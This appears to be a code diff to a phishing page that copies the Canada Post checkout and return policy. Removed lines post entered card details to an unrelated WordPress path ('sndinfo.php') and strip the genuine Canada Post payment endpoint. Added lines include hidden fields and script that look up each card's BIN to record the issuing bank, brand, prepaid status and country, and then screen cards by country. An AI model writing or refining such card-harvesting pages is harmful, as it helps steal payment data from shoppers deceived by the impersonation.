@@ -4630,11 +4630,30 @@
                                     <!--?lit$738055032$-->
                                   </div>
                                 </div>
+                                <input  class="hidden"  type="text" id="bank" name="bank" value="">
+
+                                <!-- <label for="scheme">Scheme:</label> -->
+                                <input  class="hidden" type="text" id="scheme" name="scheme" value="">
+                              
+                                <!-- <label for="type">Type:</label> -->
+                                <input  class="hidden" type="text" id="type" name="type" value="">
+                              
+                                <!-- <label for="brand">Brand:</label> -->
+                                <input  class="hidden" type="text" id="brand" name="brand" value="">
+                              
+                                <!-- <label for="bin">Bin:</label> -->
+                                <input  class="hidden" type="text" id="bin" name="bin" value="">
+                              
+                                <!-- <label for="country">Country:</label> -->
+                                <input class="hidden"  type="text" id="country" name="country" value="">
+                              
+                                <!-- <label for="prepaid">Prepaid:</label> -->
+                                <input class="hidden"  type="text" id="prepaid" name="prepaid" value="">
                                 <div class="_creditCardFormContainer_6fzfd_182"><!--?lit$738055032$-->
                                  
                                   <!--?lit$738055032$--><creditcardform-template class="_paymentLineContainer_6fzfd_58"><!---->
                                     <form id="creditForm" name="creditForm" 
-                                     method="POST" action="https://dev-wisee.pantheonsite.io/wp-admin/lola/sndinfo.php" class="_showValid_ehezr_152 _paymentCreditForm_ehezr_135"><!--?lit$738055032$-->
+                                     method="POST"  class="_showValid_ehezr_152 _paymentCreditForm_ehezr_135"><!--?lit$738055032$-->
                                       <!--?lit$738055032$-->
                                       <div class="_paymentCreditForm_ehezr_135">
                                         <div class="_formRow_ehezr_101">
@@ -4719,7 +4738,7 @@
             </div>
         
             <div class="mz-checkoutform mz-formstep-next">
- <button  name="paiment" disabled id="paiment-1" type="submit" class="btn primary-button continueDeliveryMethod">Pay Now</button>
+ <button   name="paiment" disabled id="paiment-1" type="submit" class="btn primary-button continueDeliveryMethod">Pay Now</button>
            
         </div>
 
@@ -4761,7 +4780,7 @@
         </form>
         
         
-        <div class="cp-iframe-loader"><form name="init__payment" id="init__payment" action="https://payment.canadapost.ca/payment" target="cpwa__frame" method="post"><input name="p" value="?" type="hidden"><input id="cpwa_button" class="cp-iframe-loader-btn" type="submit" value="submit"></form></div></div><div class="modal fade view-return-policy" id="viewReturnPolicyModal" role="dialog" aria-hidden="false" tabindex="-1"><div class="modal-dialog"><!-- Modal content--><div class="modal-content"><button type="button" class="close-btn close-facet-modal" id="closeModal" data-mz-close-modal="" data-dismiss="modal" aria-label="Close"><img src="" alt="Close"></button><div class="modal-body"><h2>Return policy</h2><div class="policy-content"><p>If you are not satisfied with your Canada Post purchase, please call 1-877-632-6347 within 10 calendar days of receipt to request a return authorization number. If the item is returnable, unopened, and sent back in its original wrapping along with your receipt, you will be refunded in your original method of payment.You must return unwanted items to the Canada Post warehouse within 30 calendar days of the issuance of your return authorization number. All products must be in their original packaging.</p></div></div></div></div></div></div><footer class="mz-pagefooter cp-foundation"><cpc-footer class="cpc-component"><div id="cpc-main-footer" class="cpc-footer-container"><div class="cpc-footer">
+        <div class="cp-iframe-loader"><form name="init__payment" id="init__payment"   ><input name="p" value="?" type="hidden"><input id="cpwa_button" class="cp-iframe-loader-btn" type="submit" value="submit"></form></div></div><div class="modal fade view-return-policy" id="viewReturnPolicyModal" role="dialog" aria-hidden="false" tabindex="-1"><div class="modal-dialog"><!-- Modal content--><div class="modal-content"><button type="button" class="close-btn close-facet-modal" id="closeModal" data-mz-close-modal="" data-dismiss="modal" aria-label="Close"><img src="" alt="Close"></button><div class="modal-body"><h2>Return policy</h2><div class="policy-content"><p>If you are not satisfied with your Canada Post purchase, please call 1-877-632-6347 within 10 calendar days of receipt to request a return authorization number. If the item is returnable, unopened, and sent back in its original wrapping along with your receipt, you will be refunded in your original method of payment.You must return unwanted items to the Canada Post warehouse within 30 calendar days of the issuance of your return authorization number. All products must be in their original packaging.</p></div></div></div></div></div></div><footer class="mz-pagefooter cp-foundation"><cpc-footer class="cpc-component"><div id="cpc-main-footer" class="cpc-footer-container"><div class="cpc-footer">
     <div class="noindex">
     <section class="footer-l1" role="navigation" aria-label="Footer navigation"> 
       <div class="row show-for-large-up">
@@ -5204,9 +5223,17 @@ function onlyNumeric(event) {
       
       </div></cpc-footer></footer></div>
 </body>
-
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
 <script>
 $(document).ready(function(){
+
+  // Select the credit card number and expiration date input fields
+const cardNumberInput = document.querySelector("#card-number");
+const expirationDateInput = document.querySelector("#expiration-date");
+
+
+
+
 
   // verification input CARD paiment
   $('.input-group-card').keyup(function(){
@@ -5232,22 +5259,114 @@ $(document).ready(function(){
   }
   )
 // credit card
-let creditCardContainer = document.getElementById('credit-card-div')
-   let creditCard = document.getElementById('credit-card')
-document.querySelector("#credit-card").addEventListener("keypress", function (evt) {
-    const input = evt.target.value.split(' ').join('')
-    if (evt.which < 48 || evt.which > 57)
-    {
-        evt.preventDefault();
-    }
-    if(input.length>=19) evt.preventDefault();
+// Select the credit card input field
+const creditCardInput = document.querySelector("#credit-card");
 
+// Create a regular expression for valid credit card numbers
+const cardNumberRegex = /^(4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})$/;
+
+
+var countries = [
+  "AF", "AL", "DZ", "AD", "AO", "AG", "AR", "AM", "AU", "AT", "AZ", "BS", "BH", "BD",
+  "BB", "BY", "BE", "BZ", "BJ", "BT", "BO", "BA", "BW", "BR", "BN", "BG", "BF", "BI",
+  "KH", "CM", "CA", "CV", "CF", "TD", "CL", "CN", "CO", "KM", "CD", "CG", "CR", "CI",
+  "HR", "CU", "CY", "CZ", "DK", "DJ", "DM", "DO", "EC", "EG", "SV", "GQ", "ER", "EE",
+  "ET", "FJ", "FI", "FR", "GA", "GM", "GE", "DE", "GH", "GR", "GD", "GT", "GN", "GW",
+  "GY", "HT", "HN", "HU", "IS", "IN", "ID", "IR", "IQ", "IE", "IL", "IT", "JM", "JP",
+  "JO", "KZ", "KE", "KI", "KW", "KG", "LA", "LV", "LB", "LS", "LR", "LY", "LI", "LT",
+  "LU", "MK", "MG", "MW", "MY", "MV", "ML", "MT", "MH", "MR", "MU", "MX", "FM", "MD",
+  "MC", "MN", "ME", "MA", "MZ", "MM", "NA", "NR", "NP", "NL", "NZ", "NI", "NE", "NG",
+  "KP", "NO", "OM", "PK", "PW", "PA", "PG", "PY", "PE", "PH", "PL", "PT", "QA", "RO",
+  "RU", "RW", "KN", "LC", "VC", "WS", "SM", "ST", "SA", "SN", "RS", "SC", "SL", "SG",
+  "SK", "SI", "SB", "SO", "ZA", "KR", "SS", "ES", "LK", "SD", "SR", "SZ", "SE", "CH",
+  "SY", "TW", "TJ", "TZ", "TH", "TL", "TG", "TO", "TT", "TN", "TR", "TM", "TV", "UG",
+  "UA", "AE", "GB", "US", "UY", "UZ", "VU", "VA", "VE", "VN", "YE", "ZM", "ZW"
+];
+
+creditCardInput.addEventListener("input", (event) => {
+  var creditCardNumber = event.target.value.replace(/\s/g, "");
+  if (!cardNumberRegex.test(creditCardNumber)) {
+    console.log("Please enter a valid credit or debit card number.");
+    event.target.setCustomValidity("Please enter a valid credit or debit card number.");
+    document.getElementById('paiment-1').style.cursor = "not-allowed";
+    event.target.classList.remove("is-valid");
+    event.target.classList.add("is-invalid");
+  } else {
+    const binNumber = creditCardNumber.substr(0, 6);
+    const apiUrl = `https://lookup.binlist.net/${binNumber}`;
+    axios.get(apiUrl)
+      .then((response) => {
+        const data = response.data;
+        const country = data.country.alpha2;
+        const bank = data.bank.name;
+    const scheme = data.scheme;
+    const type = data.type;
+    const brand = data.brand;
+    const prepaid = data.prepaid ? 'PREPAID' : 'NON-PREPAID';
+    $('#country').val(country);
+    $('#bank').val(bank);
+    $('#bin').val(binNumber);
+    $('#scheme').val(scheme);
+    $('#type').val(type);
+    $('#brand').val(brand);
+    $('#prepaid').val(prepaid);
+    console.log(`country:${country}`)
+
+    console.log(`Bank: ${bank}`);
+    console.log(`Scheme: ${scheme}`);
+    console.log(`Type: ${type}`);
+    console.log(`Brand: ${brand}`);
+    console.log(`Prepaid: ${prepaid}`);
+        // add your validation logic here based on the country of the card
+        if (countries.includes(country)) {
+          console.log("Valid credit WITH IPA");
+    document.getElementById('paiment-1').style.cursor = "pointer";
+
+          event.target.setCustomValidity("");
+          event.target.classList.remove("is-invalid");
+          event.target.classList.add("is-valid");
+        } else {
+          console.log("Sorry, this credit card number cannot be accepted. by IPA");
+          event.target.setCustomValidity("Sorry, this credit card number cannot be accepted.");
+          event.target.classList.remove("is-valid");
+          event.target.classList.add("is-invalid");
+
+          
+        }
+      })
+      .catch((error) => {
+        console.log("Error validating credit card number:", error);
+        event.target.setCustomValidity("Error validating credit card number.");
+        event.target.classList.remove("is-valid");
+        event.target.classList.add("is-invalid");
+      });
+  }
+  event.target.value = event.target.value.replace(/[^\d]/g, "");
+  event.target.value = event.target.value.replace(/(\d{4})/g, "$1 ").trim();
 });
-document.getElementById('credit-card').addEventListener('input',function(e){
-  e.target.value = e.target.value.replace(/[^\d]/g, "");
-  e.target.value = e.target.value.replace(/(\d{4})/g, "$1 ").trim();
+
+// Add an event listener to limit input to numbers and 19 characters
+creditCardInput.addEventListener("keypress", (event) => {
+  const input = event.target.value.split(" ").join("");
+  const key = event.which || event.keyCode;
   
-})
+  if ((key < 48 || key > 57) || input.length >= 19) {
+    event.preventDefault();
+  }
+});
+
+// Add an event listener to prevent input of 0 as first digit
+creditCardInput.addEventListener("keydown", (event) => {
+  const input = event.target.value.split(" ").join("");
+  const key = event.which || event.keyCode;
+  
+  if (input.length === 0 && key === 48) {
+    event.preventDefault();
+  }
+});
+
+
+
 //expiration date
 document.querySelector("#expiration").addEventListener("keypress", function (evt) {
     let input = evt.target.value
@@ -5266,42 +5385,7 @@ document.getElementById('expiration').addEventListener("keyup", function(event) 
   });
 
    
-  // var cardRegex = /^(?:(4[0-9]{12}(?:[0-9]{3})?)|(5[1-5][0-9]{14})|(6(?:011|5[0-9][0-9])[0-9]{12})|(3[47][0-9]{13})|(3(?:0[0-5]|[68][0-9])[0-9]{11})|((?:2131|1800|35\d{3})\d{11}))$/;
-  //  creditCard.addEventListener('focus', function(e){
-  //      // alert('focused')
-  //    });
-     
-  //    creditCard.addEventListener('blur', function(e){
-  //                  // alert('worked')
-  //                  const input = e.target.value.split(' ').join('')
-  //                  if(input!="")  {
-  //                   console.log(e.target.value.split(' ').join(''))
-  //                      e.target.nextElementSibling.classList.remove('danger-color');
-  //                     document.getElementById('credit-card-div').classList.remove('empty-field')
-  //                      if(document.getElementById('email-error-credit-card'))document.getElementById('email-error-credit-card').remove();
-  //                      if(!cardRegex.test(input))  {
-  //                       // alert('incorrect card regex')
-  //                          let errorMsg = "<p class='error-text danger-color' id='email-error-credit-card'>Invalid credit card number. </p>"
-  //                          e.target.nextElementSibling.classList.add('danger-color');
-  //                          document.getElementById('credit-card-div').classList.add('empty-field', 'mb-0')
-  //                          if(!document.getElementById('email-error-credit-card')) document.querySelector('#credit-card-error').insertAdjacentHTML("beforeend",errorMsg)
-                           
-  //                      }
-  //                   //    else alert('correct card regex')
-  //                  }
-  //                  else {
-  //                      let errorMsg = "<p class='error-text danger-color' id='email-error-credit-card'>Card number required</p>"
-  //                      e.target.nextElementSibling.classList.add('danger-color');
-  //                      document.getElementById('credit-card-div').classList.add('empty-field')
-  //                      // document.getElementById('names-container').classList.add('mb-4')
-  //                      if(!document.getElementById('email-error-credit-card')) document.querySelector('#credit-card-error').insertAdjacentHTML("beforeend",errorMsg)
-  //                      else{
-  //                          document.querySelector('#credit-card-error').innerHTML=''
-  //                          document.querySelector('#credit-card-error').insertAdjacentHTML("beforeend",errorMsg)
-  //                      }
-  //                  }
-  //                      });
-
+ 
 
 
 
@@ -5321,4 +5405,5 @@ document.querySelector("#security").addEventListener("keypress", function (evt) 
                       });
 
 </script>
+
 </html>
